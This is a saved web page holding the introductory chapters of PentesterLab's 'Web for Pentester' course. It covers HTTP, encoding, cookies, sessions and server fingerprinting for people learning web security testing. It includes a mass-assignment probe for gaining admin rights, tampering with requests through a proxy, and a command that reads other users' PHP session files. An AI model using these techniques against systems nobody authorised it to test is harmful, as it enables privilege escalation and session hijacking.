<!DOCTYPE html>
<!-- saved from url=(0059)https://pentesterlab.com/exercises/web_for_pentester/course -->
<html class=" js cssanimations csstransitions js no-touch csstransforms csstransitions"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>[PentesterLab] </title>
    <link rel="stylesheet" media="all" href="./wfp_course_files/application-67013cc5b760c8eca9859268013dacba.css" data-turbolinks-track="true">
    <script src="./wfp_course_files/application-6900e32581268075327fae3734bd9b57.js" data-turbolinks-track="true"></script>
    <script src="./wfp_course_files/checkout.js"></script>
    <meta name="csrf-param" content="authenticity_token">
<meta name="csrf-token" content="HZADE0mNsi71zPYbvG40FeFA/Z7q/8vZbtXruO8z8YbvKEHgygE0oQis7oSCOKojkq4Jdg6F7lvsMEfxXzjx5Q==">
    

    <meta name="referrer" value="no-referrer">
<link rel="icon" type="image/png" href="https://assets.pentesterlab.com/favicon.ico">

</head>
<body>
<div class="wrapper">
    <!--=== Header ===-->    
    <div class="header">
        <!-- Topbar -->
        <div class="topbar">
            <div class="container">
                <!-- Topbar Navigation -->
                <ul class="loginbar pull-right">
                    
                    <!-- <li class="topbar-devider"></li> -->
                      <li>
                        <a href="https://pentesterlab.com/users/sign_in">Login</a>
                      </li>   
                        <li class="topbar-devider"></li>   
                        <li>
                          <a href="https://pentesterlab.com/users/sign_up">Register</a>
                        </li>
                   <!-- <li class="topbar-devider"></li>   
                    <li><a href="page_faq.html">Help</a></li> --> 
                </ul>
                <!-- End Topbar Navigation -->
            </div>
        </div>
       <!-- End Topbar -->
    
        <!-- Navbar -->
        <div class="navbar navbar-default" role="navigation">
            <div class="container">
                <!-- Brand and toggle get grouped for better mobile display -->
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-responsive-collapse">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="fa fa-bars"></span>
                    </button>
                    <a class="navbar-brand" href="https://pentesterlab.com/">
                        <img id="logo-header" src="./wfp_course_files/logo_s.png" alt="Logo">
                    </a>
                </div>

                <!-- Collect the nav links, forms, and other content for toggling -->
                <div class="collapse navbar-collapse navbar-responsive-collapse">
                    <ul class="nav navbar-nav">
                        <!-- Home -->
                        <li>
                            <a href="https://pentesterlab.com/">Home</a>
                        </li>
                        <!-- End Home -->

                        <!-- Pages -->                        
                          <li>
                            <a href="https://pentesterlab.com/pro">PentesterLab PRO</a></li>
                        <!-- End Pages -->

                        <li>
                            <a href="https://pentesterlab.com/exercises/">Exercises</a>
                        </li>

                          <li>
                              <a href="https://medium.com/@PentesterLab">Articles <span class="label label-info rounded">New!</span></a>
                          </li>
                        <li>
                            <a href="https://pentesterlab.com/bootcamp">Bootcamp</a>
                        </li>

                        <!-- Features -->
                        <!-- End Features -->


                        <!-- Contacts -->
                        <!-- End Contacts -->

                        <!-- Search Block -->
                        <!-- <li>
                            <i class="search fa fa-search search-btn"></i>
                            <div class="search-open">
                                <div class="input-group animated fadeInDown">
                                    <input type="text" class="form-control" placeholder="Search">
                                    <span class="input-group-btn">
                                        <button class="btn-u" type="button">Go</button>
                                    </span>
                                </div>
                            </div>    
                        </li> -->
                        <!-- End Search Block -->
                    </ul>
                </div><!--/navbar-collapse-->
            </div>    
        </div>            
        <!-- End Navbar -->
    </div>
      
          <div class="profile container content">

      <div class="row">
            <!--Left Sidebar-->
                        <!--Left Sidebar-->
            <div class="col-md-3 md-margin-bottom-40">
                <img class="img-responsive profile-img margin-bottom-20" src="./wfp_course_files/web_for_pentester.png" alt="">

                <ul class="list-group sidebar-nav-v1 margin-bottom-40" id="sidebar-nav-1">
                    <li class="list-group-item "> 
                        <a href="https://pentesterlab.com/exercises/web_for_pentester">&nbsp;<i class="fa fa-info"></i> About</a>
                    </li>
                    <li class="list-group-item active">
                        <a href="https://pentesterlab.com/exercises/web_for_pentester/course">&nbsp;<i class="fa fa-book"></i> Course</a>
                    </li>


                    <li class="list-group-item ">
                        <a href="https://pentesterlab.com/exercises/web_for_pentester/videos">&nbsp;<i class="fa fa-file-video-o"></i> Video</a>
                    </li>
                  
                </ul>   
<!--
                <div class="panel-heading-v2 overflow-h">
                    <h2 class="heading-xs pull-left"><i class="fa fa-bar-chart-o"></i> Task Progress</h2>
                    <a href="#"><i class="fa fa-cog pull-right"></i></a>
                </div>
                <h3 class="heading-xs">Web Design <span class="pull-right">92%</span></h3>
                <div class="progress progress-u progress-xxs">
                    <div style="width: 92%" aria-valuemax="100" aria-valuemin="0" aria-valuenow="92" role="progressbar" class="progress-bar progress-bar-u">
                    </div>
                </div>
                <h3 class="heading-xs">Unify Project <span class="pull-right">85%</span></h3>
                <div class="progress progress-u progress-xxs">
                    <div style="width: 85%" aria-valuemax="100" aria-valuemin="0" aria-valuenow="85" role="progressbar" class="progress-bar progress-bar-blue">
                    </div>
                </div>
                <h3 class="heading-xs">Sony Corporation <span class="pull-right">64%</span></h3>
                <div class="progress progress-u progress-xxs margin-bottom-40">
                    <div style="width: 64%" aria-valuemax="100" aria-valuemin="0" aria-valuenow="64" role="progressbar" class="progress-bar progress-bar-dark">
                    </div>
                </div>

                <hr>
-->


            </div>
            <!--End Left Sidebar-->

            <!--End Left Sidebar-->
            
            <div class="col-md-9">
                <!--Profile Body-->
                <div class="body">
                    <!--Service Block v3-->
                    <div class="row margin-bottom-10">
  

                        <div class="col-md-12">

                          <h1 class="pull-left">Web for Pentester</h1>
<ul class="pull-right breadcrumb">
                <li class="active">
<a class="btn-u" data-toggle="modal" data-target="#new">Need help?</a></li>            </ul>
                        </div>
              </div>
          <div class="row">


                    </div><!--/end row-->
                    <!--End Service Block v3-->
                    <hr>

                    <div class="row margin-bottom-20">
                        <div class="col-md-12">
                        <!--Profile Post-->
                            <h1>Introduction</h1>

<p>This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.</p>

<p>Once you access the web application, you should see the following page:</p>

<p><img src="./wfp_course_files/screenshot.png" alt="Screenshot front page"></p>

<h1>The Web</h1>

<p>Web applications are probably the most common services exposed by companies and institutions on the internet; furthermore, most old applications have now a "web version" to be available in the browser. This massive transformation makes web security an important part of a network's security. </p>

<h2>Security model of the web</h2>

<p>The basis of the security model of the web is really simple: don't trust the client. Most information a server will receive can be spoofed by the client. Better to be safe than sorry; it's better to filter and escape everything than to realize later on that a value you thought was not user-controlled is.</p>

<h2>Web security risks</h2>

<p>Web applications present all the risks of normal applications:</p>

<ul>
<li>Compromise.</li>
<li>Information leak.</li>
<li>Reputational damage.</li>
<li>Information loss.</li>
<li>Money loss.</li>
</ul>

<h2>Web technologies</h2>

<h3>Architecture</h3>

<p>Most web applications rely on 3 components:</p>

<ul>
<li>The client: a web browser in most cases.</li>
<li>The web server that will receive requests from the client. An application server can be involved to process the requests; in that case the web server will just forward the requests to the application server.</li>
<li>The storage backend to retrieve and save information, most commonly a database.</li>
</ul>

<p>All these components may have different behaviours that will impact the existence and exploitability of vulnerability. All these components can also present vulnerabilities or security issues.</p>

<h3>Client side technologies</h3>

<p>Most of the client side technologies are used every day by most Internet users: HTML, JavaScript, Flash... through their browsers (Chromium, Firefox, Internet Explorer, Safari...). However, web applications' clients can also be a thick client connecting to a web service or just a script. </p>

<h3>Server side technologies</h3>

<p>On the server side a lot of technologies can be used and even if all may be vulnerable to any web issue, some issues are more likely to happen for a given technology.</p>

<p>The server side can be divided into more sub-categories:</p>

<ul>
<li>Web servers like Apache, lighttpd, Nginx, IIS...</li>
<li>Application servers like Tomcat, Jboss, Oracle Application server...</li>
<li>The programming language used: PHP, Java, Ruby, Python, ASP, C#, ... This programming language can also be used as part of a framework like Ruby-on-Rails, .Net MVC, Django.</li>
</ul>

<h3>Storage backend</h3>

<p>The storage backend can be located on the same server as the web server or on a different one. This can explain weird behaviour during the exploitation of some vulnerabilities.</p>

<p>A few examples of backends are:</p>

<ul>
<li>Simple files.</li>
<li>Relational databases like Mysql, Oracle, SQL Server, PostgreSQL.</li>
<li>Other databases like MongoDB, CouchDB.</li>
<li>Directories like openLDAP or Active Directory.</li>
</ul>

<p>An application can use more than one storage backend. For example, some applications use LDAP to store users and their credentials and use Oracle to store information. </p>

<h1>The HTTP protocol</h1>

<p>HTTP is the base of the web, it's really important to have a deep understanding of this protocol in order to perform web security testing. Knowing and understanding HTTP specificities will often allow you to find vulnerabilities and exploit them.</p>

<h2>A Client-server dialog</h2>

<p>HTTP is a dialog between one client and one server. The client, the browser, sends a request to the server, and then the server responds to this request. HTTP has the advantages of being a text protocol and therefore really easy to read, understand and learn for a human being. By default, most web servers are available on port TCP/80. When your browser connects to a URL <a href="http://pentesterlab.com/">http://pentesterlab.com/</a>, it's in fact doing a TCP connection to the port 80 of the IP corresponding to the name <code>pentesterlab.com</code>.</p>

<p>The most common request occurs when a browser asks the server for content. The browser sends a request composed of the following elements:</p>

<ul>
<li>An HTTP method that will allow the server to understand what kind of operation the browser wants to perform.</li>
<li>A resource that corresponds to what the client is trying to access on the server.</li>
<li>A version that will allow the server to know what version of HTTP the browser is talking.</li>
<li>Optionally, various headers giving more information to the server like the browser's name and version, the preferred language of the user (like in English, German, French,...), ...</li>
<li>Depending on the HTTP method used, a request body.</li>
</ul>

<p>As an example, a request to the URL <a href="http://vulnerable/index.php">http://vulnerable/index.php</a> will correspond to the following HTTP request:</p>

<pre>GET /index.php HTTP/1.1
Host: vulnerable
User-Agent: Mozilla Firefox
</pre>

<h2>Requests</h2>

<h3>Methods</h3>

<p>Many HTTP methods exist:</p>

<ul>
<li>The GET method: to request for content, it's the most common request sent by browsers;</li>
<li>The POST method: POST is used to send a larger amount of data; it's used by most forms and also for file upload.</li>
<li>The HEAD method: the HEAD method is very similar to the GET request, the only difference is in the response provided by the server, the response will only contain the headers and no body. HEAD is massively used by web spiders to check if a web page has been updated without downloading the full page content.</li>
</ul>

<p>There are many other HTTP methods: PUT, DELETE, PATCH, TRACE, OPTIONS, CONNECT... You can read more about them on <a href="http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods">the Wikipedia page</a>.</p>

<h3>Parameters</h3>

<p>Another important part of the request are the parameters. When a client accesses the following page <a href="http://vulnerable/article.php?id=1&amp;name=2">http://vulnerable/article.php?id=1&amp;name=2</a>, the following request is sent to the web server:</p>

<pre>GET /article.php?id=1&amp;name=2 HTTP/1.1
Host: vulnerable
User-Agent: Mozilla Firefox
</pre>

<p>POST requests are really similar, but instead the parameters are sent in the request body. For example, the following form:</p>

<pre>&lt;html&gt;
    [...] 
  &lt;body&gt;
    &lt;form action="/login.php" method="POST"&gt;
      Username: &lt;input type="text" name="username"/&gt; &lt;br/&gt;
      Password: &lt;input type="password" name="password"/&gt; &lt;br/&gt;
      &lt;input type="submit" value="Submit"&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
</pre>

<p>This HTML code corresponds to the following login form:</p>

<p><img src="./wfp_course_files/login-page.png" alt="login.php"></p>

<p>Once the form is filled with the following values: </p>

<ul>
<li>username equals 'admin',</li>
<li>password equals 'Password123'.</li>
</ul>

<p>And after it gets submitted, the following request is sent to the server:</p>

<pre>POST /login.php HTTP/1.1
Host: vulnerable
User-Agent: Mozilla Firefox
Content-Length: 35
  
username=admin&amp;password=Password123
</pre>

<p>NB: if the method <code>GET</code> was used in the <code>&lt;form</code> tag, the values provided will be sent as part of the URL and look like:</p>

<pre>GET /login.php?username=admin&amp;password=Password123 HTTP/1.1
Host: vulnerable
User-Agent: Mozilla Firefox
</pre>

<p>If the form tag contains an attribute <code>enctype="multipart/form-data"</code>, the request sent will be different:</p>

<pre>POST /upload/example1.php HTTP/1.1
Host: vulnerable
Content-Length: 305
User-Agent: Mozilla/5.0 [...] AppleWebKit
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfLW6oGspQZKVxZjA

------WebKitFormBoundaryfLW6oGspQZKVxZjA
Content-Disposition: form-data; name="image"; filename="myfile.html"
Content-Type: text/html

My file

------WebKitFormBoundaryfLW6oGspQZKVxZjA
Content-Disposition: form-data; name="send"

Send file
------WebKitFormBoundaryfLW6oGspQZKVxZjA--
</pre>

<p>We can see that there is a different <code>Content-type</code> header: <code>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfLW6oGspQZKVxZjA</code>. The "<code>Webkit</code>" comes from a Webkit-based browser; other browsers will use a long random string instead. This string is repeated for every part of the multipart information. The last part contains the string followed by <code>--</code>.</p>

<p>When you upload a file, this is what the browser uses. In the multi-part section dedicated to the file, you will see the following information:</p>

<ul>
<li>The file name: <code>myfile.html</code>.</li>
<li>The parameter name: <code>image</code>.</li>
<li>The file content type: <code>text/html</code>.</li>
<li>The file content: <code>My file</code>.</li>
</ul>

<p>It's also possible to send parameters as an array (or hash depending on the parsing performed on the server side). You can for example use: <code>/index.php?id[1]=0</code> to encode an array containing the value <code>0</code>. </p>

<p>This method of encoding is often used by frameworks to perform automatic request to object mapping. For example, the following request: <code>user[name]=louis&amp;user[group]=1</code> will be mapped to an object <code>User</code> with the attribute <code>name</code> equal to <code>louis</code> and the attribute <code>group</code> mapped to <code>1</code>. This automatic mapping can sometimes be exploited using attacks named mass-assignment. By sending additional parameters, you can, if the application does not protect against it, change attributes in the receiving object. In our previous example, you could for example add <code>user[admin]=1</code> to the request and see if your user gets administrator privileges. </p>

<h3>HTTP Headers</h3>

<p>As we saw, HTTP requests contain a lot of HTTP Headers. You can obviously manipulate all of them but if you provide incorrect values the request is likely to be rejected or the header won't be used. </p>

<p>Furthermore, most applications only use few HTTP headers:</p>

<ul>
<li><code>Referer</code>: to know where the clients come from;</li>
<li><code>Cookie</code>: to retrieve the cookies;</li>
<li><code>User-Agent</code>: to know what browser users use;</li>
<li><code>X-Forwarded-For</code>: to get the source IP address (even if it's not the best method to do this).</li>
</ul>

<p>Other HTTP headers are mostly used by the web server, you can also find security vulnerabilities in their handling. However, you are less likely to find a bug in a web server than in a web application.</p>

<p>One of the most important headers is <code>Host</code>. The <code>Host header</code> is mainly used by the web server to know what web site you are trying to access. When more than one website is hosted on the same server, the web server uses this header to do virtual-hosting: even if you are always connecting to the same IP address, the server reads the <code>Host</code> information and serves the right content based on this. If you put the IP address in the Host header or an invalid hostname, you can sometimes get another website and get extra-information from this. </p>

<h2>Responses</h2>

<p>When you send a request, the server will respond back with an HTTP response. For example, the following response could be sent back:</p>

<pre>HTTP/1.1 200 OK
Date: Sun, 03 Mar 2013 10:56:20 GMT
Server: Apache/2.2.16 (Debian)
X-Powered-By: PHP/5.3.3-7+squeeze14
Content-Length: 6988
Content-Type: text/html

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;PentesterLab » Web for Pentester&lt;/title&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;meta name="description" content="Web For Pentester"&gt;
    &lt;meta name="author" content="Louis Nyffenegger louis@pentesterlab.com"&gt;
[...]
</pre>

<p>An important part of the response is the status code; it's followed by a reason and is located in the first line of the response. It's used by clients to know how to handle the response. The following status codes are the most common ones:</p>

<ul>
<li><code>200 OK</code>: the request was processed successfully.</li>
<li><code>302 Found</code>: used to redirect users, for example when they logout, to send them back to the login page.</li>
<li><code>401 Unauthorized</code>: when the resource's access is restricted.</li>
<li><code>404 Not found</code>: the resource requested by the client was not found.</li>
<li><code>500 Internal Server Error</code>: an error occured during the processing of the request.</li>
</ul>

<p>Some of them are far less common like <code>418: I'm a teapot</code>.</p>

<p>After the status code, you can see the HTTP headers.</p>

<p>HTTP headers contain a lot of information and will influence how the browser will handle the request and interpret its content. In the response above, we can see the following information:</p>

<ul>
<li>The date.</li>
<li>The <code>Server</code> header which provides a lot of information about what the remote web server is.</li>
<li>The <code>X-Powered-By</code> header that gives even more information.</li>
<li>The <code>Content-Length</code> header to tell the browser how big the response will be.</li>
<li>The <code>Content-Type</code> header to tell the browser what to expect. This header will change the browser behaviour; if the header is <code>text/html</code>, the browser will try to render the response. If it's <code>text/plain</code>, it shouldn't try to render it. </li>
</ul>

<p>The content is the information sent back. It can be an HTML page, some images, everything basically. When your browser retrieves a HTML page, it will parse it and retrieve each of the resources automatically:</p>

<ul>
<li>JavaScript files.</li>
<li>CSS files.</li>
<li>Images.</li>
<li>...</li>
</ul>

<h2>HTTPs</h2>

<p>HTTPs is just HTTP done on top of a Secure Socket Layer (SSL). The SSL part ensures the client that:</p>

<ul>
<li>He's talking to the right server: authentication;</li>
<li>The communication is secure: encryption.</li>
</ul>

<p>Multiple versions of SSL exist with some of them considered weak (SSLv1 and SSLv2).</p>

<p>SSL can also be used to ensure the client's identity. Client certificates can be used to ensure that only people with valid certificates can connect to the server and send requests. This is a great way to limit access to a service, and is often used for systems requiring a high security level (payment gateway, sensitive web service). However, maintaining certificates (and revocation lists) can be a pain for large deployments.</p>

<h2>Listening to HTTP traffic</h2>

<p>There are 3 ways to listen to HTTP traffic:</p>

<ul>
<li>By listening to the network directly with tools like Wireshark or tcpdump.</li>
<li>In the browser; most browsers have an extension allowing a user to see what traffic is transmitted and received.</li>
<li>By setting up a proxy between the browser and server.</li>
</ul>

<p>Each of these methods has advantages and disadvantages. We will see later that it really depends on whether or not the communications are using Secure Socket Layer (SSL), and whether or not the user wants to be able to intercept/modify the request.</p>

<h2>Generating HTTP traffic</h2>

<p>Generating HTTP traffic can be performed in different ways:</p>

<ul>
<li>Since it's a text-oriented protocol, you can just use a tool like telnet or netcat and type your request.</li>
<li>Sending HTTP traffic can also be done using a programming language. All of them can easily be used to write and read traffic from a socket, and communicate with the server. Furthermore, most languages have an HTTP library allowing a programmer to easily build and send requests and get the corresponding responses.</li>
<li>Finally, the easiest way to generate an HTTP request is to use a browser.</li>
</ul>

<p>Using a browser is obviously the easiest way to access a website. However, other methods will allow you to have better access to details, and to craft any HTTP requests.</p>

<p>Using telnet (or netcat) you can quickly send HTTP requests:  </p>

<pre>$ telnet vulnerable 80
GET / HTTP/1.1
Host: vulnerable

[...]
</pre>

<p>You can also do the same thing using netcat:</p>

<pre>$ echo "GET / HTTP/1.1\r\nHost: vulnerable\r\n\r\n" | nc vulnerable 80
[...]
</pre>

<h2>Data encoding</h2>

<h3>Code vs. data</h3>

<p>Most security issues come from the fact that an attacker is able to put code where the application expects data. Most of the web security issues like XSS or SQL injections come from this; the application receives data, but uses this data as code.</p>

<h3>URL encoding</h3>

<p>As we have seen, some characters are used in HTTP to distinguish between:</p>

<ul>
<li>Each request's lines: <code>\r\n</code>.</li>
<li>Each part of the HTTP request (like between the method and the URI): space <code></code>.</li>
<li>The path and the parameters: <code>?</code>.</li>
<li>Each parameter: <code>&amp;</code>; </li>
<li>A parameter name and the corresponding value: <code>=</code>.</li>
</ul>

<p>However, for most attacks these characters are needed, in order to ensure a character is understood as a value and not as part of a request's delimiter; it needs to be encoded. The simplest encoding consists of using <code>%</code> followed by the <strong>hexadecimal</strong> value of the character. In the same way, since <code>%</code> is used to encode values, it should be encoded...</p>

<p>In order to retrieve the hexadecimal value of a given character, the ascii table can be used. The following table shows characters used as part of the HTTP protocol and their URL-encoded value:</p>

<table class="table table-bordered">
  <thead>
    <tr>
      <th>Character</th><th>URL encoded value</th> 
    </tr> 
  </thead> 
  <tbody> 
    <tr><td>\r</td><td>%0d</td></tr>
    <tr><td>\n</td><td>%0a</td></tr>
    <tr><td><space> </space></td><td>%20 or `+`</td></tr>
    <tr><td>?</td><td>%3f</td></tr>
    <tr><td>&amp;</td><td>%26</td></tr>
    <tr><td>=</td><td>%3d</td></tr>
    <tr><td>;</td><td>%3b</td></tr>
    <tr><td>#</td><td>%23</td></tr>
    <tr><td>%</td><td>%25</td></tr>
  </tbody>
</table> 

<p>You can use the ASCII table to get the full list. It can be retrieved by running <code>man ascii</code> on most Linux systems, or by googling "ascii table". </p>

<div class="protip">
If you are doing a lot of web application testing, it's probably a good idea to print the ascii table and keep it on your desk. 
</div>

<h3>Double encoding</h3>

<p>Sometimes, the system being tested can also decode the provided value, twice. For example, the web server can do a first decoding and the application a second one. In this case, you will need to double encode the special characters you want to send.</p>

<p>To do so, you just need to re-encode the encoded value. For example, if you want to double-encoded an equal sign <code>=</code>, you will need to encode it as a <code>%3d</code> and then re-encode it: <code>%253d</code>.</p>

<p>Once receiving <code>%253d</code>, the web server may decode it as <code>%3d</code> and the web application may decode <code>%3d</code> again as <code>=</code>. </p>

<p>Double encoding can also be used to bypass some filtering mechanisms, under some conditions. This behaviour obviously depends on the behaviour of each component in the chain involved, during the handling of the HTTP request.</p>

<h3>HTML encoding</h3>

<p>As with URL encoding, some characters in HTML have a specific semantic and should therefore be encoded if they need to be used without their semantics' implication.</p>

<table class="table table-bordered">
  <thead>
    <tr>
      <th>Character</th><th>HTML encoded value</th> 
    </tr> 
  </thead> 
  <tbody> 
    <tr><td>&gt;</td><td>&amp;gt;</td></tr>
    <tr><td>&lt;</td><td>&amp;lt;</td></tr>
    <tr><td>&amp;</td><td>&amp;amp;</td></tr>
    <tr><td>"</td><td>&amp;quote;</td></tr>
    <tr><td>'</td><td>&amp;#39;</td></tr>
  </tbody>
</table> 

<p>Any character can also be encoded using their </p>

<ul>
<li><strong>Decimal</strong> value, for example, <code>=</code> can be encoded as <code>&amp;#61;</code>.</li>
<li><strong>Hexadecimal</strong> value, for example, <code>=</code> can be encoded as <code>&amp;#x3d;</code>.</li>
</ul>

<h2>Cookies and sessions</h2>

<p>Cookies (and indirectly sessions) are used to keep information between two HTTP requests. If a browser sends two times the same request without cookies, there is no way for the server to see that it's the same person. You could think that the IP address is enough, however a lot of people share the same IP address in corporate environments and mobile networks (since they go through the same proxy). It's also possible to keep information on the current user using information as part of the URL but this can quickly get ugly and the information is easily available in the browser's history. </p>

<p>Cookies are initially sent by the server using an HTTP header: <code>Set-Cookie</code>. Once this header is received, the browser will automatically send the cookie back to the server, in all subsequent requests sent to this server, using a <code>Cookie</code> header. </p>

<p>The <code>Set-Cookie</code> header contains many optional fields: </p>

<ul>
<li>An expiration date: to tell the browser when it should delete the cookie.</li>
<li>A <code>Domain</code>: to tell the browser what sub-domain or hostname the cookie should be sent to. </li>
<li>A <code>Path</code>: to tell the browser which path the cookies should be sent.</li>
<li>Security flags.</li>
</ul>

<p>By default, the <code>Path</code> and <code>Domain</code> are mostly used to increase or restrict the availability of a given cookie for the application within the same domain or within the same server.</p>

<div class="protip">
I once reviewed an application where it was possible to access other companies' information by sending the cookies received by companyA.domain.com to companyB.domain.com... The cookie scope was limited to each sub-domain so it didn't get detected earlier.
</div>

<p>Cookies can have two security related flags:</p>

<ul>
<li>httpOnly: to prevent the access to the cookies by JavaScript code. This mechanism prevents trivial exploitation of Cross-Site Scripting by limiting direct access to cookies using <code>document.cookie</code> in JavaScript.</li>
<li>secure: to prevent the browser from sending the cookies over unencrypted communications. This is mostly used to limit the risk of someone getting his cookie stolen, when browsing a web site without a secure connection. </li>
</ul>

<p>Sessions are mechanisms that use cookies as a transport medium. The main problem with cookies is that users can intercept and tamper with them. To prevent this, developers started using sessions. The cookie sent back to the user contains a session identifier (session id). When the user sends the cookie back in the next requests, the application uses this session identifier to access information stored locally. This information can be stored in a file, in a database or in memory. Some sessions' mechanisms also encrypt the data for security reasons. </p>

<p><code>Rack::Session::Cookie</code> is used by default in Rack based applications (most of Ruby applications use Rack). This provides a different session mechanism. The information is sent back to users, but is signed with a secret. This way, the users cannot tamper with the information in the session (but they can still access it, once they decode it).</p>

<p>By default, in PHP, the sessions are saved using one file per session and are stored unencrypted (on Debian in <code>/var/lib/php5/</code>). If you have local access to the system you can go and read other peoples' session information. If for example your session id (the value sent back in the cookie value) is <code>o8d7lr4p16d9gec7ofkdbnhm93</code>, you will see a file named <code>sess_o8d7lr4p16d9gec7ofkdbnhm93</code> which contains the information in the session:</p>

<pre># cat /var/lib/php5/sess_o8d7lr4p16d9gec7ofkdbnhm93
pentesterlab|s:12:"pentesterlab";
</pre>

<div class="protip">
A web server can share sessions between multiple applications. It's always interesting to check if a valid session for one application can give you access to another application.
</div>

<h2>HTTP authentication</h2>

<p>HTTP also provides mechanisms to authenticate users. There are three methods available as part of the protocol:</p>

<ul>
<li>Basic Authentication: the username and password are encoded using base64 and sent using an <code>Authorization</code> header: <code>Authorization: basic YWRtaW46YWRtaW4K</code>.</li>
<li>Digest Authentication: the server sends a challenge (unique information to be used), the client responds to this challenge (hash information including the password provided by the user). This mechanism prevents the password from being sent unencrypted to the server.</li>
<li>NTLM authentication: that is  mostly used in the Microsoft world and is quite similar to Digest.</li>
</ul>

<h2>Web services</h2>

<p>Web services are mostly a simple way to call remote methods using HTTP. It's basically a fancy way to send calls to the server and get a response back. The information sent can be:</p>

<ul>
<li>Sent as with any other HTTP requests for REST.</li>
<li>Sent using XML messages for SOAP.</li>
<li>Sent using JSON-based message.</li>
</ul>

<p>The remote method called can be retrieved by the server:</p>

<ul>
<li>Based on the URL.</li>
<li>Based on the HTTP header (<code>SOAPAction</code> for example).</li>
<li>Based on the message content.</li>
</ul>

<p>Testing web services is really similar to testing traditional web applications, aside from the fact that your browser will probably not (out of the box) be able to talk to the server-side. But once you have examples of requests, you can easily use a scripting language or any tool allowing you to send HTTP request to fuzz and attack the server-side code.</p>

<h2>Web application security</h2>

<p>In this section, we will see where application security should be performed.</p>

<h3>Client Side Security</h3>

<p>A common misconception of developers is to perform security checks on the client side, for example in JavaScript. For example, to validate a phone number. </p>

<p>First the user will enter the phone number:</p>

<p><img src="./wfp_course_files/js_ok2s.svg.png" alt="jsok"></p>

<p>The JavaScript code will then check the value:</p>

<p><img src="./wfp_course_files/js_ok3s.svg.png" alt="jsok"></p>

<p><br><br>
And the value seems correct:</p>

<p><img src="./wfp_course_files/js_ok4s.svg.png" alt="jsok"></p>

<p>The value will then be sent to the server:</p>

<p><img src="./wfp_course_files/js_ok5s.svg.png" alt="jsok"></p>

<p>The browser won't send the request if the phone number is not in the correct format:</p>

<p><img src="./wfp_course_files/js_nok2s.svg.png" alt="jsok"></p>

<p>The JavaScript will check the value:</p>

<p><img src="./wfp_course_files/js_nok3s.svg.png" alt="jsok"></p>

<p>And reject it:</p>

<p><img src="./wfp_course_files/js_nok4s.svg.png" alt="jsok"></p>

<p>The request will not be sent to the server.</p>

<p>These types of checks are inefficient, are easily bypassed and should not be used as security mechanisms. However, these checks can reduce the load on the server, by limiting the number of requests to process. If each client's information is correct before being sent, fewer incorrect requests will be sent, and this will lower the server's load.</p>

<h3>Bypassing Client Side Checks</h3>

<p>To bypass client side checks, you need to setup a proxy like <a href="http://portswigger.net/burp">Burp Suite</a>. Once you have the proxy running, you need to tell your browser to send the requests through this proxy (by changing its configuration or environment variables depending on your browser and operating system). You will then see the requests sent by your browser and will be able to intercept and tamper with them. </p>

<p>Once you set up the proxy, you will be able to intercept the request sent by your browser:</p>

<p><img src="./wfp_course_files/proxy1s.svg.png" alt="proxy"></p>

<p>Then you can modify it:</p>

<p><img src="./wfp_course_files/proxy2s.svg.png" alt="proxy"></p>

<p>And the server will respond to your modified request:</p>

<p><img src="./wfp_course_files/proxy3s.svg.png" alt="proxy"></p>

<p>By using the correct value in the browser, the form gets submitted. However, the proxy is then used to modify the value and start attacking the web application:</p>

<p><img src="./wfp_course_files/js_proxy1s.svg.png" alt="jsproxy"></p>

<p><img src="./wfp_course_files/js_proxy2s.svg.png" alt="jsproxy"></p>

<h3>Server side</h3>

<p>Applications' security should be performed on the server side. All information received should not be trusted; data itself or data format should be considered as malicious. Don't expect a parameter to be a string; it can be a hash or an array. Don't expect a parameter to be an integer; it can be a string. Even the hostname of the current server (provided by the <code>Host</code> header) can be malicious. Don't trust anything and make sure you double check everything. It's likely that someone will find out about something, if you build a weak application. <br>
 Don't expect people to not find out about something; if you build something weak it's likely that someone will find out.</p>

<h1>Fingerprinting</h1>

<p>Fingerprinting is the first task of a web application test. Fingerprinting will provide the tester with a lot of useful information, which would exacerbate other vulnerabilities, potentially leading to successful exploitation.</p>

<h2>Fingerprinting the web server</h2>

<p>Fingerprinting the web server consists of trying to retrieve as much information as possible about it:</p>

<ul>
<li>Name and version of the server.</li>
<li>Is an application server used in the backend?</li>
<li>Database backend, is the database on the same host.</li>
<li>Usage of a reverse proxy.</li>
<li>Load balancing.</li>
<li>Programming language used.</li>
</ul>

<p>Retrieving the server name and version can be easily done by inspecting the HTTP headers:</p>

<pre>$ telnet vulnerable 80
GET / HTTP/1.1
Host: vulnerable

HTTP/1.1 200 OK
Date: Sun, 03 Mar 2013 10:56:20 GMT
Server: Apache/2.2.16 (Debian)
X-Powered-By: PHP/5.3.3-7+squeeze14
Content-Length: 6988
Content-Type: text/html
</pre>

<p>You can also use a bad <code>Host</code> header (or just the IP) to get the default virtual-host and get more information:</p>

<pre>$ telnet vulnerable 80
GET / HTTP/1.1
Host: thisisabadvalue

</pre>

<h2>Browsing the web site</h2>

<p>Another action to perform during the fingerprinting process is to simply browse the website and keep track of any interesting functionalities found:</p>

<ul>
<li>Upload and download functionalities.</li>
<li>Authentication forms and links: login, logout, password recovery functions.</li>
<li>Administration section.</li>
<li>Data entry points: "Leave a comment", "Contact us" forms.</li>
</ul>

<p>During this phase, it's interesting to check the source of the web page and search for HTML comments. Comments often provide interesting information about the web site. All browsers allow you to access the source of the web page. You can then search for HTML comments tags: i.e. information between <code>&lt;!--</code> and <code>--&gt;</code>. Most of the time, the source code is coloured and the comments are easy to spot:</p>

<p><img src="./wfp_course_files/comments.png" alt="comments"></p>

<p>The file extension used by the web site will provide you more information about which technology is being used:</p>

<ul>
<li>if you see <code>.php</code> file, the application is written in PHP;</li>
<li>if you see <code>.jsp</code> or <code>.do</code> files, the application is written in Java;</li>
<li>...</li>
</ul>

<div class="danger">
